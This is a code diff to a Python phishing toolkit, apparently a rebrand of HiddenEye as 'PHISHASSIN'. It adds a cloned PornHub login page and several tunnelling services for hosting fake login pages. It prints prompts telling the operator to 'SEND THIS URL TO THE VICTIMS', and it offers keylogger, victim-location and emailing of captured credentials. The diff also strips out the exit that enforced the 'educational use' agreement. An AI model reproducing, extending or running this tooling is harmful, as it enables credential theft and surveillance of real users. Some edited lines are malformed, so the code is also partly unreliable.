@@ -102,6 +102,8 @@ def runPhishing(page, customOption):  # Phishing pages selection menu
         copy_tree("WebPages/spotify/", "Server/www/")
     elif page == 'Quora':
         copy_tree("WebPages/quora/", "Server/www/")
+    elif page == 'PornHub':
+        copy_tree("WebPages/pornhub/", "Server/www/")
     elif page == 'Adobe':
         copy_tree("WebPages/adobe/", "Server/www/")
     elif page == 'Badoo':
@@ -168,10 +170,10 @@ def runPhishing(page, customOption):  # Phishing pages selection menu
 
 def selectPort():  # Question where user must select port
     system('clear')
-    print('''
-       phisassin
-     print("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(MAIN0, MAIN4))
-    choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
+    print(''' PHISHASSIN
+       '''.format(MAIN0, MAIN2))
+    print("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(MAIN0, MAIN4))
+    choice = input(" \n{0}PHISHASSIN >>> {2}".format(MAIN0, MAIN4, MAIN2))
     try:
         if (int(choice) > 65535 or int(choice) < 1):
             return selectPort()
@@ -183,13 +185,12 @@ def selectPort():  # Question where user must select port
 
 def selectServer(port):  # Question where user must select server
     system('clear')
-    print(
-        '''
-         " {0}PHISASSIN
-"          \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+    print('''
+      PHISHASSIN
+      '''.format(MAIN0, MAIN2))
     print(
         "\n {0}[{1}*{0}]{0}Select Any Available Server:{1}".format(MAIN0, MAIN4))
-    print("\n {0}[{1}0{0}]{1}LOCALHOST {0} [LAN] \n {0}[{1}1{0}]{1}Ngrok\n {0} [WAN,PREFFERED] 
+    print("\n {0}[{1}0{0}]{1}LAN \n {0}[{1}1{0}]{1}WAN\n ".format(MAIN0, MAIN2))
 
     choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
     if choice == '0':
@@ -198,13 +199,28 @@ def selectServer(port):  # Question where user must select server
     elif choice == '1':
         system('clear')
         runNgrok(port)
-   
+    elif choice == '2':
+        system('clear')
+        runServeo(port)
+    elif choice == '3':
+        system('clear')
+        runLocalxpose(port)
+    elif choice == '4':
+        system('clear')
+        runLT(port, True)
+    elif choice == '5':
+        system('clear')
+        runOpenport(port)
+    elif choice == '6':
+        system('clear')
+        runPagekite(port)
+    else:
+        system('clear')
+        return selectServer(port)
 
 def runLocalhost(port):
     system('clear')
-    print('''
-       PHISASSIN
-          [ LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+    print('''PHISHASSIN'''.format(MAIN0, MAIN2))
     print("\n {0}[{1}*{0}]{0}Enter Your LocalHost/Router Address [ifconfig]:{1}".format(MAIN0, MAIN4))
     host = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
     system("fuser -k %s/tcp > /dev/null 2>&1".format(port))
@@ -213,18 +229,16 @@ def runLocalhost(port):
     sleep(2)
     system('clear')
     print('''
-
-       PHISASSIN
-          \n\n-------------------------------\n{0}[ RUNNING LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+       PHISHASSIN
+       '''.format(MAIN0, MAIN2))
     print("\n{0}[{1}!{0}]{1} SEND THIS URL TO THE VICTIMS ON SAME NETWORK-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://{4}:{3}\n".format(MAIN0, MAIN2, MAIN3, port, host))
     print("\n")
-
 
 def runNgrok(port):
     system('killall -2 ngrok > /dev/null')
     system('clear')
     print('''
-       PHISASIN \n\n-------------------------------\n{0}[ NGROK SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+       PHISHASSIN '''.format(MAIN0, MAIN2))
     system('./Server/ngrok http {} > /dev/null &'.format(port))
     while True:
         sleep(2)
@@ -241,6 +255,8 @@ def runNgrok(port):
 
 
 
+
+
 def runMainMenu():  # menu where user select what they wanna use
     # Terms Of Service
     sleep(6)
@@ -251,10 +267,9 @@ def runMainMenu():  # menu where user select what they wanna use
     red  = '\033[31m'
     print("\n\n\n              {2}WITH GREAT {1}POWER {3}- {2}COMES GREAT {1}RESPONSIBILITY      ".format(orange, red, purple, blue))
     
-    if input("\n\n\n\n{2}[{1}!{2}]{3} Do you agree to use this tool for educational/testing purposes only? {1}({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0, orange)).upper() != 'Y':
+    if input("\n\n\n\n{2}[{1}!{2}]{3} Do you agree to use this tool for educational/testing purposes only? {1}({0}Y{1}/{2}N{1})\n{2}PHISHASSIN >>> {0}".format(MAIN2, MAIN4, MAIN0, orange)).upper() != 'Y' :
         system('clear')
-        print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(MAIN0, MAIN4))
-        exit()
+       
 
 
 def mainMenu():
@@ -264,7 +279,8 @@ def mainMenu():
         version = ver_current.strip()
     print('''
 
- {2} PHISASSIN
+PHISHASSIN
+
              {3}[{2} Modern Phishing Tool With Advanced Functionality {3}]
 {3}[{2} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {3}]
 ________________________________________________________________________________'''.format(MAIN3, MAIN4, MAIN2, MAIN0, version))
@@ -289,14 +305,14 @@ ________________________________________________________________________________
         MAIN0, MAIN2))
     print(" {0}[{1}10{0}]{1} Yahoo          {0}[{1}22{0}]{1} Quora          {0}[{1}34{0}]{1} Yandex ".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}11{0}]{1} Twitch         {0}[{1}23{0}]{1} ++BROKEN++        {0}[{1}35{0}]{1} Reddit ".format(
+    print(" {0}[{1}11{0}]{1} Twitch         {0}[{1}23{0}]{1} BROKEN        {0}[{1}35{0}]{1} Reddit ".format(
         MAIN0, MAIN2))
     print(" {0}[{1}12{0}]{1} Microsoft      {0}[{1}24{0}]{1} Adobe          {0}[{1}36{0}]{1} Subito.it ".format(
         MAIN0, MAIN2))
     print("\n{0}SOCIAL-ENGINEERING-TOOLS:".format(MAIN0, MAIN2))
     print(" {0}[{1}A{0}]{1} Get Victim Location".format(MAIN0, MAIN2))
 
-    option = input("\n{0}HiddenEye >>>  {1}".format(MAIN0, MAIN2))
+    option = input("\n{0}PHISASSIN >>>  {1}".format(MAIN0, MAIN2))
     if option == '1' or option == '01':
         loadModule('Facebook')
         customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
@@ -480,9 +496,7 @@ def loadModule(module):  # This one just show text..
 
 def inputCustom():  # Question where user can input custom web-link
     system('clear')
-    print('''{1}
-       PHISHASSIN
-          [ PUT YOUR REDIRECTING URL HERE ] {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+    print('''PHISHASSIN'''.format(MAIN0, MAIN2))
     print(
         '''\n{1}**{0}(Do not leave it blank. Unless Errors may occur)'''.format(MAIN2, MAIN4))
     print(
@@ -527,8 +541,7 @@ def inputCustom():  # Question where user can input custom web-link
 
 def emailPrompt():
     system('clear')
-    print('''{1}
-       PHISHASSIN
+    print('''PHISHASSIN
 '''.format(MAIN0, MAIN2))
     print(
         "-------------------------------\n{0}[ PROMPT: NEED CAPTURED DATA TO EMAIL ? ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
@@ -556,8 +569,11 @@ def addingEmail():
 def emailPrompt2():
     system('clear')
     print('''{1}
-       PHISHASSIN
-          
+        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {1}http://github.com/darksecdevelopers
+        {0}** BY: {1}DARKSEC {0}**
 '''.format(MAIN0, MAIN2))
     print(
         "-------------------------------\n{0}[ PROMPT: CONFIG EMAIL CREDENTIAL FILE ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
@@ -606,8 +622,8 @@ def emailConfig():
 def cloudfarePrompt():
 
     system('clear')
-    print('''
-          PHISHASSIN
+    print('''{1}
+       PHISHASSIN
 '''.format(MAIN0, MAIN2))
     print(
         "-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
@@ -633,7 +649,7 @@ def addCloudfare():
 def keyloggerprompt():
     system('clear')
     print('''
-          PHISHASSIN
+PHISHASSIN
 '''.format(MAIN0, MAIN2))
     print(
         "-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
@@ -712,7 +728,16 @@ def endMessage(port):  # Message when HiddenEye exit
     elif choice == 'X' or choice == 'x':
         system('clear')
         print('''
-                 PHISHASSIN
+                  {3}PHISHASSIN {3}BY: EZIO69
+            {1}https://github.com/DarkSecDevelopers/HiddenEye
+
+  {3}  [[*]] IF YOU LIKE THIS TOOL, THEN PLEASE HELP TO BECOME BETTER.
+  {0}
+     [{3}!{0}] PLEASE LET US KNOW , IF ANY PHISHING PAGE GOT BROKEN .
+     [{3}!{0}] MAKE PULL REQUEST, LET US KNOW YOU SUPPORT US.
+     [{3}!{0}] IF YOU HAVE MORE PHISHING PAGES, THEN JUST MAKE A PULL REQUEST.
+     [{3}!{0}] PLEASE DON'T HARM ANYONE , ITS ONLY FOR EDUCATIONAL PURPOSE.
+     [{3}!{0}] WE WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS TOOL
 
   {3}  [[*]] THANKS FOR USE THIS TOOL. HAPPY HACKING ... GOOD BYE \n '''.format(MAIN2, MAIN2, MAIN4, MAIN0))
     else:
